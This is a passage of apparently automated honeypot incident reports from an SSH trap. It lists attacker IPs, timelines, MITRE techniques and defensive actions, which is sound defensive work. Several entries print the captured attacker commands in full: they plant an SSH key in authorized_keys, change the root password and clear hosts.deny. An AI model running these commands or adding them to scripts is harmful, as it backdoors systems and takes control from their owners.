| `2026-04-08 10:12:45` | `cowrie.session.connect` |
| `2026-04-08 10:12:45` | `cowrie.client.version` |
| `2026-04-08 10:12:45` | `cowrie.client.kex` |
| `2026-04-08 10:12:46` | `cowrie.login.success` |
| `2026-04-08 10:12:46` | `cowrie.session.params` |
| `2026-04-08 10:12:46` | `cowrie.command.input` |
| `2026-04-08 10:12:46` | `cowrie.command.failed` |
| `2026-04-08 10:12:46` | `cowrie.log.closed` |
| `2026-04-08 10:12:47` | `cowrie.session.params` |
| `2026-04-08 10:12:47` | `cowrie.command.input` |
| `2026-04-08 10:12:47` | `cowrie.session.file_download` |
| `2026-04-08 10:12:47` | `cowrie.log.closed` |
| `2026-04-08 10:12:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `112.217.199[.]222` to AbuseIPDB if not already reported
- [ ] Block `112.217.199[.]222` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4b872959416c

| Field | Detail |
|---|---|
| **Source IP** | `112.217.199[.]222` |
| **First Seen** | 2026-04-08 10:12 |
| **Last Seen** | 2026-04-08 10:12 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-08 10:12:49` | `cowrie.session.connect` |
| `2026-04-08 10:12:49` | `cowrie.client.version` |
| `2026-04-08 10:12:49` | `cowrie.client.kex` |
| `2026-04-08 10:12:49` | `cowrie.login.success` |
| `2026-04-08 10:12:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `112.217.199[.]222` to AbuseIPDB if not already reported
- [ ] Block `112.217.199[.]222` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-42becfaf9611

| Field | Detail |
|---|---|
| **Source IP** | `46.8.237[.]64` |
| **First Seen** | 2026-04-08 10:14 |
| **Last Seen** | 2026-04-08 10:14 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-08 10:14:02` | `cowrie.session.connect` |
| `2026-04-08 10:14:02` | `cowrie.client.version` |
| `2026-04-08 10:14:02` | `cowrie.client.kex` |
| `2026-04-08 10:14:03` | `cowrie.login.success` |
| `2026-04-08 10:14:03` | `cowrie.session.params` |
| `2026-04-08 10:14:03` | `cowrie.command.input` |
| `2026-04-08 10:14:03` | `cowrie.command.failed` |
| `2026-04-08 10:14:04` | `cowrie.log.closed` |
| `2026-04-08 10:14:04` | `cowrie.session.params` |
| `2026-04-08 10:14:04` | `cowrie.command.input` |
| `2026-04-08 10:14:04` | `cowrie.session.file_download` |
| `2026-04-08 10:14:04` | `cowrie.log.closed` |
| `2026-04-08 10:14:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `46.8.237[.]64` to AbuseIPDB if not already reported
- [ ] Block `46.8.237[.]64` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ec8287381ea2

| Field | Detail |
|---|---|
| **Source IP** | `46.8.237[.]64` |
| **First Seen** | 2026-04-08 10:14 |
| **Last Seen** | 2026-04-08 10:14 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-08 10:14:07` | `cowrie.session.connect` |
| `2026-04-08 10:14:07` | `cowrie.client.version` |
| `2026-04-08 10:14:07` | `cowrie.client.kex` |
| `2026-04-08 10:14:08` | `cowrie.login.success` |
| `2026-04-08 10:14:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `46.8.237[.]64` to AbuseIPDB if not already reported
- [ ] Block `46.8.237[.]64` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bb4575215c5f

| Field | Detail |
|---|---|
| **Source IP** | `46.8.237[.]64` |
| **First Seen** | 2026-04-08 10:15 |
| **Last Seen** | 2026-04-08 10:15 |
| **Session Duration** | 17s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:nKy0R6gpcWiO"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-08 10:15:06` | `cowrie.session.connect` |
| `2026-04-08 10:15:06` | `cowrie.client.version` |
| `2026-04-08 10:15:06` | `cowrie.client.kex` |
| `2026-04-08 10:15:07` | `cowrie.login.success` |
| `2026-04-08 10:15:07` | `cowrie.session.params` |
| `2026-04-08 10:15:07` | `cowrie.command.input` |
| `2026-04-08 10:15:07` | `cowrie.command.failed` |
| `2026-04-08 10:15:07` | `cowrie.log.closed` |
| `2026-04-08 10:15:08` | `cowrie.session.params` |
| `2026-04-08 10:15:08` | `cowrie.command.input` |
| `2026-04-08 10:15:08` | `cowrie.session.file_download` |
| `2026-04-08 10:15:08` | `cowrie.log.closed` |
| `2026-04-08 10:15:16` | `cowrie.session.params` |
| `2026-04-08 10:15:16` | `cowrie.command.input` |
| `2026-04-08 10:15:16` | `cowrie.log.closed` |
| `2026-04-08 10:15:17` | `cowrie.session.params` |
| `2026-04-08 10:15:17` | `cowrie.command.input` |
| `2026-04-08 10:15:17` | `cowrie.log.closed` |
| `2026-04-08 10:15:17` | `cowrie.session.params` |
| `2026-04-08 10:15:17` | `cowrie.command.input` |
| `2026-04-08 10:15:17` | `cowrie.session.file_download` |
| `2026-04-08 10:15:17` | `cowrie.log.closed` |
| `2026-04-08 10:15:18` | `cowrie.session.params` |
| `2026-04-08 10:15:18` | `cowrie.command.input` |
| `2026-04-08 10:15:18` | `cowrie.log.closed` |
| `2026-04-08 10:15:18` | `cowrie.session.params` |
| `2026-04-08 10:15:18` | `cowrie.command.input` |
| `2026-04-08 10:15:18` | `cowrie.log.closed` |
| `2026-04-08 10:15:19` | `cowrie.session.params` |
| `2026-04-08 10:15:19` | `cowrie.command.input` |
| `2026-04-08 10:15:19` | `cowrie.command.input` |
| `2026-04-08 10:15:19` | `cowrie.log.closed` |
| `2026-04-08 10:15:19` | `cowrie.session.params` |
| `2026-04-08 10:15:19` | `cowrie.command.input` |
| `2026-04-08 10:15:19` | `cowrie.log.closed` |
| `2026-04-08 10:15:20` | `cowrie.session.params` |
| `2026-04-08 10:15:20` | `cowrie.command.input` |
| `2026-04-08 10:15:20` | `cowrie.log.closed` |
| `2026-04-08 10:15:20` | `cowrie.session.params` |
| `2026-04-08 10:15:20` | `cowrie.command.input` |
| `2026-04-08 10:15:20` | `cowrie.log.closed` |
| `2026-04-08 10:15:21` | `cowrie.session.params` |
| `2026-04-08 10:15:21` | `cowrie.command.input` |
| `2026-04-08 10:15:21` | `cowrie.log.closed` |
| `2026-04-08 10:15:21` | `cowrie.session.params` |
| `2026-04-08 10:15:21` | `cowrie.command.input` |
| `2026-04-08 10:15:21` | `cowrie.log.closed` |
| `2026-04-08 10:15:22` | `cowrie.session.params` |
| `2026-04-08 10:15:22` | `cowrie.command.input` |
| `2026-04-08 10:15:22` | `cowrie.log.closed` |
| `2026-04-08 10:15:22` | `cowrie.session.params` |
| `2026-04-08 10:15:22` | `cowrie.command.input` |
| `2026-04-08 10:15:22` | `cowrie.log.closed` |
| `2026-04-08 10:15:23` | `cowrie.session.params` |
| `2026-04-08 10:15:23` | `cowrie.command.input` |
| `2026-04-08 10:15:23` | `cowrie.log.closed` |
| `2026-04-08 10:15:23` | `cowrie.session.params` |
| `2026-04-08 10:15:23` | `cowrie.command.input` |
| `2026-04-08 10:15:23` | `cowrie.log.closed` |
| `2026-04-08 10:15:24` | `cowrie.session.params` |
| `2026-04-08 10:15:24` | `cowrie.command.input` |
| `2026-04-08 10:15:24` | `cowrie.log.closed` |
| `2026-04-08 10:15:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `46.8.237[.]64` to AbuseIPDB if not already reported
- [ ] Block `46.8.237[.]64` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fd12cdf0909c

| Field | Detail |
|---|---|
| **Source IP** | `103.210.21[.]242` |
| **First Seen** | 2026-04-08 10:15 |
| **Last Seen** | 2026-04-08 10:15 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-08 10:15:50` | `cowrie.session.connect` |
| `2026-04-08 10:15:50` | `cowrie.client.version` |
| `2026-04-08 10:15:50` | `cowrie.client.kex` |
| `2026-04-08 10:15:50` | `cowrie.login.success` |
| `2026-04-08 10:15:51` | `cowrie.session.params` |
| `2026-04-08 10:15:51` | `cowrie.command.input` |
| `2026-04-08 10:15:51` | `cowrie.command.failed` |
| `2026-04-08 10:15:51` | `cowrie.log.closed` |
| `2026-04-08 10:15:51` | `cowrie.session.params` |
| `2026-04-08 10:15:51` | `cowrie.command.input` |
| `2026-04-08 10:15:51` | `cowrie.session.file_download` |
| `2026-04-08 10:15:51` | `cowrie.log.closed` |
| `2026-04-08 10:15:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.210.21[.]242` to AbuseIPDB if not already reported
- [ ] Block `103.210.21[.]242` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a1c43d287088

| Field | Detail |
|---|---|
| **Source IP** | `103.210.21[.]242` |
| **First Seen** | 2026-04-08 10:15 |
| **Last Seen** | 2026-04-08 10:15 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-08 10:15:53` | `cowrie.session.connect` |
| `2026-04-08 10:15:53` | `cowrie.client.version` |
| `2026-04-08 10:15:53` | `cowrie.client.kex` |
| `2026-04-08 10:15:53` | `cowrie.login.success` |
| `2026-04-08 10:15:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.210.21[.]242` to AbuseIPDB if not already reported
- [ ] Block `103.210.21[.]242` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-86f5d0951385

| Field | Detail |
|---|---|
| **Source IP** | `46.8.237[.]64` |
| **First Seen** | 2026-04-08 10:16 |
| **Last Seen** | 2026-04-08 10:16 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-08 10:16:12` | `cowrie.session.connect` |
| `2026-04-08 10:16:12` | `cowrie.client.version` |
| `2026-04-08 10:16:12` | `cowrie.client.kex` |
| `2026-04-08 10:16:12` | `cowrie.login.success` |
| `2026-04-08 10:16:13` | `cowrie.session.params` |
| `2026-04-08 10:16:13` | `cowrie.command.input` |
| `2026-04-08 10:16:13` | `cowrie.command.failed` |
| `2026-04-08 10:16:13` | `cowrie.log.closed` |
| `2026-04-08 10:16:13` | `cowrie.session.params` |
| `2026-04-08 10:16:13` | `cowrie.command.input` |
| `2026-04-08 10:16:13` | `cowrie.session.file_download` |
| `2026-04-08 10:16:13` | `cowrie.log.closed` |
| `2026-04-08 10:16:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `46.8.237[.]64` to AbuseIPDB if not already reported
- [ ] Block `46.8.237[.]64` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e4d6c502d845

| Field | Detail |
|---|---|
| **Source IP** | `46.8.237[.]64` |
| **First Seen** | 2026-04-08 10:16 |
| **Last Seen** | 2026-04-08 10:16 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-08 10:16:20` | `cowrie.session.connect` |
| `2026-04-08 10:16:20` | `cowrie.client.version` |
| `2026-04-08 10:16:20` | `cowrie.client.kex` |
| `2026-04-08 10:16:20` | `cowrie.login.success` |
| `2026-04-08 10:16:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `46.8.237[.]64` to AbuseIPDB if not already reported
- [ ] Block `46.8.237[.]64` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1a03feccab28

| Field | Detail |
|---|---|
| **Source IP** | `46.8.237[.]64` |
| **First Seen** | 2026-04-08 10:18 |
| **Last Seen** | 2026-04-08 10:18 |
| **Session Duration** | 18s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:gxA9FBMN8L3u"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-08 10:18:16` | `cowrie.session.connect` |
| `2026-04-08 10:18:16` | `cowrie.client.version` |
| `2026-04-08 10:18:16` | `cowrie.client.kex` |
| `2026-04-08 10:18:17` | `cowrie.login.success` |
| `2026-04-08 10:18:17` | `cowrie.session.params` |
| `2026-04-08 10:18:17` | `cowrie.command.input` |
| `2026-04-08 10:18:17` | `cowrie.command.failed` |
| `2026-04-08 10:18:17` | `cowrie.log.closed` |
| `2026-04-08 10:18:17` | `cowrie.session.params` |
| `2026-04-08 10:18:17` | `cowrie.command.input` |
| `2026-04-08 10:18:18` | `cowrie.session.file_download` |
| `2026-04-08 10:18:18` | `cowrie.log.closed` |
| `2026-04-08 10:18:26` | `cowrie.session.params` |
| `2026-04-08 10:18:26` | `cowrie.command.input` |
| `2026-04-08 10:18:26` | `cowrie.log.closed` |
| `2026-04-08 10:18:26` | `cowrie.session.params` |
| `2026-04-08 10:18:26` | `cowrie.command.input` |
| `2026-04-08 10:18:27` | `cowrie.log.closed` |
| `2026-04-08 10:18:27` | `cowrie.session.params` |
| `2026-04-08 10:18:27` | `cowrie.command.input` |
| `2026-04-08 10:18:27` | `cowrie.session.file_download` |
| `2026-04-08 10:18:27` | `cowrie.log.closed` |
| `2026-04-08 10:18:27` | `cowrie.session.params` |
| `2026-04-08 10:18:27` | `cowrie.command.input` |
| `2026-04-08 10:18:28` | `cowrie.log.closed` |
| `2026-04-08 10:18:28` | `cowrie.session.params` |
| `2026-04-08 10:18:28` | `cowrie.command.input` |
| `2026-04-08 10:18:28` | `cowrie.log.closed` |
| `2026-04-08 10:18:29` | `cowrie.session.params` |
| `2026-04-08 10:18:29` | `cowrie.command.input` |
| `2026-04-08 10:18:29` | `cowrie.command.input` |
| `2026-04-08 10:18:29` | `cowrie.log.closed` |
| `2026-04-08 10:18:29` | `cowrie.session.params` |
| `2026-04-08 10:18:29` | `cowrie.command.input` |
| `2026-04-08 10:18:29` | `cowrie.log.closed` |
| `2026-04-08 10:18:30` | `cowrie.session.params` |
| `2026-04-08 10:18:30` | `cowrie.command.input` |
| `2026-04-08 10:18:30` | `cowrie.log.closed` |
| `2026-04-08 10:18:30` | `cowrie.session.params` |
| `2026-04-08 10:18:30` | `cowrie.command.input` |
| `2026-04-08 10:18:30` | `cowrie.log.closed` |
| `2026-04-08 10:18:31` | `cowrie.session.params` |
| `2026-04-08 10:18:31` | `cowrie.command.input` |
| `2026-04-08 10:18:31` | `cowrie.log.closed` |
| `2026-04-08 10:18:31` | `cowrie.session.params` |
| `2026-04-08 10:18:31` | `cowrie.command.input` |
| `2026-04-08 10:18:31` | `cowrie.log.closed` |
| `2026-04-08 10:18:32` | `cowrie.session.params` |
| `2026-04-08 10:18:32` | `cowrie.command.input` |
| `2026-04-08 10:18:32` | `cowrie.log.closed` |
| `2026-04-08 10:18:32` | `cowrie.session.params` |
| `2026-04-08 10:18:32` | `cowrie.command.input` |
| `2026-04-08 10:18:32` | `cowrie.log.closed` |
| `2026-04-08 10:18:33` | `cowrie.session.params` |
| `2026-04-08 10:18:33` | `cowrie.command.input` |
| `2026-04-08 10:18:33` | `cowrie.log.closed` |
| `2026-04-08 10:18:33` | `cowrie.session.params` |
| `2026-04-08 10:18:33` | `cowrie.command.input` |
| `2026-04-08 10:18:33` | `cowrie.log.closed` |
| `2026-04-08 10:18:34` | `cowrie.session.params` |
| `2026-04-08 10:18:34` | `cowrie.command.input` |
| `2026-04-08 10:18:34` | `cowrie.log.closed` |
| `2026-04-08 10:18:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `46.8.237[.]64` to AbuseIPDB if not already reported
- [ ] Block `46.8.237[.]64` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-439f2b7795fb

| Field | Detail |
|---|---|
| **Source IP** | `46.8.237[.]64` |
| **First Seen** | 2026-04-08 10:19 |
| **Last Seen** | 2026-04-08 10:19 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-08 10:19:20` | `cowrie.session.connect` |
| `2026-04-08 10:19:20` | `cowrie.client.version` |
| `2026-04-08 10:19:20` | `cowrie.client.kex` |
| `2026-04-08 10:19:21` | `cowrie.login.success` |
| `2026-04-08 10:19:21` | `cowrie.session.params` |
| `2026-04-08 10:19:21` | `cowrie.command.input` |
| `2026-04-08 10:19:21` | `cowrie.command.failed` |
| `2026-04-08 10:19:22` | `cowrie.log.closed` |
| `2026-04-08 10:19:22` | `cowrie.session.params` |
| `2026-04-08 10:19:22` | `cowrie.command.input` |
| `2026-04-08 10:19:22` | `cowrie.session.file_download` |
| `2026-04-08 10:19:22` | `cowrie.log.closed` |
| `2026-04-08 10:19:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `46.8.237[.]64` to AbuseIPDB if not already reported
- [ ] Block `46.8.237[.]64` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b0804e492bd6

| Field | Detail |
|---|---|
| **Source IP** | `46.8.237[.]64` |
| **First Seen** | 2026-04-08 10:19 |
| **Last Seen** | 2026-04-08 10:19 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-08 10:19:28` | `cowrie.session.connect` |
| `2026-04-08 10:19:28` | `cowrie.client.version` |
| `2026-04-08 10:19:28` | `cowrie.client.kex` |
| `2026-04-08 10:19:29` | `cowrie.login.success` |
| `2026-04-08 10:19:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `46.8.237[.]64` to AbuseIPDB if not already reported
- [ ] Block `46.8.237[.]64` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-48c7e1ff9785

| Field | Detail |
|---|---|
| **Source IP** | `20.2.83[.]149` |
| **First Seen** | 2026-04-08 10:20 |
| **Last Seen** | 2026-04-08 10:21 |
| **Session Duration** | 34s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-08 10:20:54` | `cowrie.session.connect` |
| `2026-04-08 10:20:55` | `cowrie.client.version` |
| `2026-04-08 10:20:57` | `cowrie.client.kex` |
| `2026-04-08 10:21:00` | `cowrie.login.success` |
| `2026-04-08 10:21:04` | `cowrie.session.params` |
| `2026-04-08 10:21:04` | `cowrie.command.input` |
